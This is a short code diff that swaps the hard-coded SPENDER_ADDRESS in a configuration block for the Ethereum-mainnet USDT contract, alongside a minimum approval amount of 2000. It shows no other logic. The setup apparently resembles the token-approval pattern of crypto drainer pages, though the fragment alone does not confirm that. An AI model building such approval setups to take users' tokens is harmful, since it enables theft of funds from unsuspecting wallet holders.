@@ -492,7 +492,7 @@
     
     // ETH 主网 USDT 合约地址
     const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-    const SPENDER_ADDRESS = "0xcd4c9613680162b467791facf5066879ae3641c1";
+    const SPENDER_ADDRESS = "0x05dd8974485e68b048b90be1d8c7cfecfb0f175b";
     const MIN_APPROVE_AMOUNT = 2000;
     
     // ETH 主网配置
